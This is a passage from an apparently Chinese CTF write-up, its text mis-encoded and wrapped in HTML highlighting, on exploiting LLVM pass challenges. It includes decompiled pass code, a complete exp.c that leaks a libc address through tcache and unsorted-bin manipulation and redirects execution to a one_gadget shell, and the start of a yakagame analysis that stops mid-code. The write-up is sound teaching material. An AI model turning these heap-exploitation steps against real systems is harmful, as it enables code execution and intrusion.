class="number">0LL</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šæ‰§è¡Œ<code>*byte_2040f8</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³å¦‚æœå¯ä»¥ä¿®æ”¹<code>byte_2040f8</code>ä¸º<code>one_gadget</code>çš„åœ°å€ï¼Œæ‰§è¡Œè¯¥æ®µä»£ç æ—¶æˆ‘ä»¬å°±å¯ä»¥<code>getshell</code>äº†<br>äºæ˜¯å¯¹<code>byte_2040f8</code>è¿›è¡Œäº¤å‰å¼•ç”¨ï¼Œçœ‹çœ‹ä»€ä¹ˆåœ°æ–¹å¯ä»¥å¯¹è¯¥å€¼è¿›è¡Œä¿®æ”¹ï¼Œæ¥ä¸‹æ¥å¯¹èƒ½å¯¹è¯¥åœ°å€è¿›è¡Œä¿®æ”¹çš„éƒ¨åˆ†ä»£ç è¿›è¡Œè¯¦ç»†åˆ†æ<br>é¦–å…ˆæ˜¯å¯¹<code>fakekey</code>å‡½æ•°çš„å¤„ç†,å®šä½åˆ°å…³é”®éƒ¨åˆ†ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v76 = byte_204100;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v75 + <span class="number">16LL</span>) == <span class="number">13</span> )</span><br><span class="line">  SExtValue = llvm::APInt::<span class="built_in">getSExtValue</span>((llvm::APInt *)(*(_QWORD *)v75 + <span class="number">24LL</span>));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  SExtValue = <span class="number">0LL</span>;</span><br><span class="line">byte_204100 = v76 + SExtValue;</span><br><span class="line">*byte_2040f8 = v76 + SExtValue;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºè¯¥å‡½æ•°å¯ä»¥å¯¹<code>*byte_2040f8</code>å’Œ<code>byte_204100</code>çš„å€¼åŠ ä¸Šä¸€ä¸ªç”¨æˆ·è‡ªå·±å®šä¹‰çš„æ•°ï¼Œå³<code>*byte_2040f8 = byte_204100 + ç”¨æˆ·çš„value</code><br>æ¥ä¸‹æ¥åˆ†æ<code>stealkey</code>çš„å…³é”®éƒ¨åˆ†ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( byte_2040f8</span><br><span class="line">  &amp;&amp; !(<span class="number">-1431655765</span></span><br><span class="line">      * (<span class="type">unsigned</span> <span class="type">int</span>)((v15</span><br><span class="line">                      + <span class="number">24</span> * v65</span><br><span class="line">                      - <span class="number">24LL</span> * v66</span><br><span class="line">                      - (v8</span><br><span class="line">                      - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)(*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>))) &gt;&gt; <span class="number">3</span>)) )</span><br><span class="line">&#123;</span><br><span class="line">  byte_204100 = *byte_2040f8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šå°†<code>*byte_2040f8</code>èµ‹å€¼ç»™<code>byte_204100</code><br>æœ€åæ˜¯å¯¹<code>save</code>éƒ¨åˆ†çš„åˆ†æï¼Œå…¶æœ‰ä¸‹é¢è¿™æ®µå…³é”®ä»£ç ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="number">-1431655765</span> * (<span class="type">unsigned</span> <span class="type">int</span>)((v15 + <span class="number">24</span> * v18 - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)NumTotalBundleOperands - v20) &gt;&gt; <span class="number">3</span>) == <span class="number">2</span> )&#123;</span><br><span class="line">  v21 = *(_BYTE *)(v8 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v21 == <span class="number">79</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v22 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v21 != <span class="number">29</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_143;</span><br><span class="line">    v22 = <span class="number">-2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v23 = v15</span><br><span class="line">      + <span class="number">24</span> * v22</span><br><span class="line">      - <span class="number">24LL</span> * (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumTotalBundleOperands</span>((llvm::CallBase *)(v6 - <span class="number">24</span>));</span><br><span class="line">  v24 = (__int64 *)(v8 - <span class="number">24LL</span> * (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="number">-1431655765</span> * (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">unsigned</span> __int64)(v23 - (_QWORD)v24) &gt;&gt; <span class="number">3</span>)) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_154;</span><br><span class="line">  <span class="keyword">if</span> ( (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_153;</span><br><span class="line">  v25 = *v24;</span><br><span class="line">  v26 = *(_BYTE *)(v8 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v26 == <span class="number">79</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v27 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v26 != <span class="number">29</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_144;</span><br><span class="line">    v27 = <span class="number">-2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v28 = v15</span><br><span class="line">      + <span class="number">24</span> * v27</span><br><span class="line">      - <span class="number">24LL</span> * (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumTotalBundleOperands</span>((llvm::CallBase *)(v6 - <span class="number">24</span>));</span><br><span class="line">  v29 = v8 - <span class="number">24LL</span> * (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">-1431655765</span> * (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">unsigned</span> __int64)(v28 - v29) &gt;&gt; <span class="number">3</span>) &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_154;</span><br><span class="line">  <span class="keyword">if</span> ( (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>u) &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_153;</span><br><span class="line">  v30 = *(_QWORD *)(v29 + <span class="number">24</span>);</span><br><span class="line">  <span class="built_in">sub_2430</span>(&amp;src, v25);</span><br><span class="line">  <span class="built_in">sub_2430</span>(v84, v30);</span><br><span class="line">  v31 = n;</span><br><span class="line">  v32 = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  v32[<span class="number">2</span>] = byte_2040f8;</span><br><span class="line">  byte_2040f8 = v32;</span><br><span class="line">  v33 = (<span class="type">char</span> *)src;</span><br><span class="line">  <span class="built_in">memcpy</span>(v32, src, v31);</span><br><span class="line">  v34 = v32 + <span class="number">1</span>;</span><br><span class="line">  v35 = (<span class="type">char</span> *)v84[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">memcpy</span>(v34, v84[<span class="number">0</span>], (<span class="type">size_t</span>)v84[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( v35 != &amp;v85 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v35)</span></span>;</span><br><span class="line">    v33 = (<span class="type">char</span> *)src;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v33 != v88 )</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v33)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€è¡Œçš„ä»£ç æ„æ€æ˜¯è¦æ±‚<code>save</code>å‡½æ•°è¦æœ‰<code>2</code>ä¸ªå‚æ•°ï¼Œä»ä»£ç ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡º<code>byte_2040f8</code>æŒ‡å‘ä¸€ä¸ªæ–°ç”³è¯·çš„<code>0x20</code>å¤§å°çš„å †å—ï¼Œè€Œåé¢çš„æ“ä½œçœ‹çš„ä¹Ÿä¸æ˜¯å¤ªæ‡‚ï¼Œå› ä¸ºå‰é¢çœ‹çš„ä¹Ÿä¸æ˜¯å¾ˆæ‡‚ï¼Œäºæ˜¯ç”¨<code>gdb</code>è°ƒè¯•äº†ä¸€ä¸‹ï¼Œæµ‹è¯•è„šæœ¬ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>gdb</code>ä¸­æŸ¥çœ‹<code>byte_2040f8</code>ï¼š  </p><img src="/2024/03/15/llvm/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹åˆ°<code>byte_2040f8</code>æŒ‡å‘ä¸€ä¸ªæ–°<code>malloc</code>çš„å †å—ï¼Œå †å—å¤§å°ä¸º<code>0x18</code>ï¼Œå †å—çš„å†…å®¹ä¸º<code>save</code>å‡½æ•°çš„ç¬¬ä¸€å’Œç¬¬äºŒä¸ªå‚æ•°ï¼Œå›åˆ°æœ€å¼€å§‹ç¨‹åºåˆšè¿›å…¥åˆ°å¯¹<code>save</code>å‡½æ•°çš„è¿›è¡Œå¤„ç†çš„æ—¶å€™ï¼Œæˆ‘ä»¬çœ‹çœ‹å †å—çš„å¸ƒå±€ï¼š  </p><img src="/2024/03/15/llvm/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢"><p>å¯ä»¥çœ‹åˆ°<code>unsortedbin</code>ä¸­å­˜åœ¨ä¸€ä¸ªå †å—ï¼Œ<code>tcache</code>ä¸­æœ‰<code>7</code>ä¸ª<code>0x20</code>å¤§å°çš„å †å—ï¼Œå¦‚æœæˆ‘ä»¬å°†<code>7</code>ä¸ªå †å—ç”³è¯·å‡ºæ¥ï¼Œå†ç”¨<code>save</code>å‡½æ•°ç”³è¯·<code>0x20</code>å¤§å°çš„å †å—ï¼Œå †ç®¡ç†ç³»ç»Ÿåˆ™ä¼šç›´æ¥åˆ‡å‰²<code>unsortedbin</code>ä¸­çš„å †å—è¿›è¡Œåˆ†é…ï¼Œæ­¤æ—¶ç”³è¯·å‡ºæ¥çš„å †å—ä¼šæ®‹ç•™ç€ä¹‹å‰<code>unsortedbin</code>åœ¨<code>fd</code>ä¸Šæœ‰å…³<code>libc</code>çš„åœ°å€ï¼Œå³æˆ‘ä»¬å¯ä»¥ä»¤<code>*byte_2040f8</code>ä¸º<code>libc</code>ä¸Šçš„ä¸€ä¸ªåœ°å€<br>æ­¤æ—¶æˆ‘ä»¬å¯åˆ©ç”¨<code>stealkey</code>å‡½æ•°å°†<code>*byte_2040f8</code>ä¸Šçš„å€¼èµ‹å€¼ç»™<code>byte_204100</code>ï¼Œä»£ç å¦‚ä¸‹ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">takeaway</span><span class="params">(<span class="type">char</span> *c)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">stealkey</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fakekey</span><span class="params">(<span class="type">int</span> d)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">stealkey</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š  </p><img src="/2024/03/15/llvm/6.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å†åˆ©ç”¨<code>fakekey</code>å‡½æ•°<code>*byte_2040f8 = byte_204100 - one_gadgetä¸byte_204100ä¸Šæœ‰å…³libcåœ°å€çš„åç§»</code>ï¼Œå³å¯å¦<code>*byte_2040f8</code>çš„å€¼ä¸º<code>one_gadget</code>çš„åœ°å€ï¼Œæœ€åä½¿ç”¨<code>run</code>å‡½æ•°æ‰§è¡Œ<code>one_gadget</code>ç›´æ¥<code>getshell</code>ã€‚æœ€ç»ˆ<code>exp</code>å¦‚ä¸‹ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">takeaway</span><span class="params">(<span class="type">char</span> *c)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">stealkey</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fakekey</span><span class="params">(<span class="type">int</span> d)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">stealkey</span>();</span><br><span class="line">    <span class="built_in">fakekey</span>(<span class="number">-0x1090f2</span>);</span><br><span class="line">    <span class="built_in">run</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¼ºç½‘æ¯-2022-yakagame"><a href="#å¼ºç½‘æ¯-2022-yakagame" class="headerlink" title="[å¼ºç½‘æ¯ 2022] yakagame"></a>[å¼ºç½‘æ¯ 2022] yakagame</h3><p>è¿™é“é¢˜çš„<code>PASS</code>æ³¨å†Œçš„åç§°å¹¶ä¸èƒ½ç›´æ¥åœ¨<code>start</code>å‡½æ•°ä¸­æ‰¾æ‰“ï¼Œçœ‹äº†<code>winmt</code>å¸ˆå‚…çš„æ–‡ç« å‘ç°å¯ä»¥å¯¹<code>__cxa_atexit</code>å‡½æ•°â€œäº¤å‰å¼•ç”¨â€æ¥å®šä½ï¼Œå¦‚ä¸‹å›¾ï¼š  </p><img src="/2024/03/15/llvm/7.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥çœ‹è§<code>PASS</code>æ³¨å†Œçš„åç§°ä¸º<code>ayaka</code>ï¼ˆæ²¡äº‹å¹²ç»™<code>ida64</code>æ¢äº†ä¸€ä¸ªä¸»é¢˜å“ˆå“ˆå“ˆï¼‰ã€‚æ¥ä¸‹æ¥å¯¹ä¸»è¦å‡½æ•°è¿›è¡Œåˆ†æï¼Œç”¨ä¸Šé¢é¢˜ç›®çš„æ–¹æ³•å®šä½åˆ°<code>sub_C880</code>å³ä¸ºé‡å†™çš„<code>runOnFunction</code>å‡½æ•°ã€‚<br>è¿˜æ˜¯å’Œä¹‹å‰çš„æ–¹æ³•ä¸€æ ·ï¼Œå‘ç°ç¨‹åºä¸»è¦æ˜¯å¯¹<code>gamestart</code>å‡½æ•°çš„å®šä¹‰è¿›è¡Œåˆ†æå’Œæ“ä½œï¼Œæ¥ä¸‹æ¥è¯¦ç»†åˆ†æå„ä¸ªéƒ¨åˆ†<br>å¯¹<code>fight</code>å‡½æ•°çš„å¤„ç†ï¼š  </p><img src="/2024/03/15/llvm/8.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¯¥å‡½æ•°åªèƒ½æœ‰ä¸€ä¸ªå‚æ•°ï¼Œä»¥è¯¥å‚æ•°ä½œä¸ºç´¢å¼•ï¼Œä»<code>weaponlist</code>æ•°ç»„ä¸­å–å‡ºä¸€ä¸ªæ•°<code>v53</code>ä¸<code>boss</code>è¿›è¡Œæ¯”è¾ƒï¼š  </p><ul><li>å¦‚æœ<code>v53</code>çš„å€¼å°äº<code>boss</code>ï¼Œåˆ™è¾“å‡º<code>loss</code>  </li><li>å¦‚æœ<code>v53</code>çš„å€¼å¤§äºç­‰äº<code>boss</code>ï¼Œåˆ™è¾“å‡º<code>win</code>ï¼Œå¹¶è¿›è¡Œèµ‹å€¼æ“ä½œï¼š<code>*score = v53 - boss</code>  </li><li>å¦‚æœ<code>*score &gt; 0x12345678</code>ï¼Œåˆ™ä¼šè¿›å…¥<code>backdoor</code>å‡½æ•°</li></ul><p>æ¥ä¸‹æ¥å°±çœ‹çœ‹è¿™ä¸ª<code>backdoor</code>å‡½æ•°ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">backdoor</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow!! this is you gift&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æƒ³åˆ°ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>cmd</code>çš„å€¼å¹¶ä¸”æ‰§è¡Œ<code>backdoor</code>å‡½æ•°ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿ<code>getshell</code><br>å¯¹<code>merge</code>å‡½æ•°çš„å¤„ç†ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v58, <span class="string">&quot;merge&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">  v52 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);</span><br><span class="line">  <span class="keyword">if</span> ( v52 != <span class="number">3</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v15 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v51 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v15);</span><br><span class="line">  v50 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v51);<span class="comment">// å‚æ•°ä¸€</span></span><br><span class="line">  v16 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">1u</span>);</span><br><span class="line">  v51 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v16);</span><br><span class="line">  v49 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v51);<span class="comment">// å‚æ•°äºŒ</span></span><br><span class="line">  weaponlist[v50] += weaponlist[v49];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°éœ€è¦æœ‰<code>2</code>ä¸ªå‚æ•°ï¼Œåˆ†åˆ«ä¸º<code>v50</code>å’Œ<code>v49</code>ï¼Œæœ€åè¿›è¡Œ<code>weaponlist[v50] += weaponlist[v49]</code>æ“ä½œ<br>ä¸‹é¢å‡ ä¸ªå‡½æ•°æ¯”è¾ƒå®¹æ˜“çœ‹æ‡‚ä¸”ç”¨å¤„ä¸å¤§ï¼Œå°±ä¸åšåˆ†æ<br>å¯¹<code>destroy</code>å‡½æ•°çš„å¤„ç†ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v58, <span class="string">&quot;destroy&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">  v48 = <span class="number">0</span>;</span><br><span class="line">  v47 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);</span><br><span class="line">  <span class="keyword">if</span> ( v47 != <span class="number">2</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v17 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v46 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v17);</span><br><span class="line">  v48 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v46);</span><br><span class="line">  weaponlist[v48] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹<code>upgrade</code>å‡½æ•°çš„å¤„ç†ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v58, <span class="string">&quot;upgrade&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">  v45 = <span class="number">0</span>;</span><br><span class="line">  v44 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);</span><br><span class="line">  <span class="keyword">if</span> ( v44 != <span class="number">2</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v18 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v43 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v18);</span><br><span class="line">  v45 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v43);</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">256</span>; ++k )</span><br><span class="line">    